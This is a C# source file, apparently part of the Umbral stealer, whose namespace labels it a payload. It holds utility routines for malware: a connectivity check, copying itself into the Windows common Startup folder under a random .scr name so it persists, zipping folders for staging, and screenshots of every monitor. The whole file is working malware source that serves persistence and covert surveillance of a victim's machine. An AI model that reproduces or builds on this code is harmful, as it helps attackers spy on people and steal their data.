using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Umbral.payload.Utilities
{
    internal static class Common
    {
        internal static async Task<bool> IsConnectionAvailable()
        {
            try
            {
                using (var httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(5.0) })
                {
                    var response = await httpClient.GetAsync("https://gstatic.com/generate_204");
                    return response.StatusCode ==
                           HttpStatusCode.NoContent;
                }
            }
            catch
            {
                return false;
            }
        }

        internal static bool IsInStartup()
        {
            try
            {
                var currentPath = Assembly.GetCallingAssembly().Location;
                var directoryPath = Path.GetDirectoryName(currentPath);
                string[] startupPath =
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup),
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                };

                return startupPath.Contains(directoryPath);
            }
            catch
            {
                Console.WriteLine("Failed getting current directory");
                return false;
            }
        }

        internal static string GenerateRandomString(int length)
        {
            var random = new Random();
            var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            var result = new StringBuilder();

            for (var i = 0; i < length; i++)
                result.Append(chars[random.Next(0, chars.Length)]);

            return result.ToString();
        }

        internal static bool PutInStartup()
        {
            var currentPath = Assembly.GetExecutingAssembly().Location;
            var startupDir = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
            var newFilePath = Path.Combine(startupDir, $"{GenerateRandomString(5)}.scr");

            try
            {
                File.Copy(currentPath, newFilePath, true);
                return true;
            }
            catch
            {
                return false;
            }
        }

        internal static bool Compress(string src, string dst)
        {
            if (Directory.Exists(src) && !File.Exists(dst) && Directory.Exists(Path.GetDirectoryName(dst)))
                try
                {
                    ZipFile.CreateFromDirectory(src, dst, CompressionLevel.Optimal, false, Encoding.UTF8);
                    return true;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                    return false;
                }

            return false;
        }

        internal static Bitmap[] CaptureScreenShot()
        {
            List<Bitmap> results = new List<Bitmap>();
            Screen[] allScreens = Screen.AllScreens;

            foreach (Screen screen in allScreens)
            {
                try
                {
                    Rectangle bounds = screen.Bounds;
                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                    {
                        using (Graphics graphics = Graphics.FromImage(bitmap))
                        {
                            graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
                        }
                        results.Add((Bitmap)bitmap.Clone());
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }

            return results.ToArray();
        }
    }
}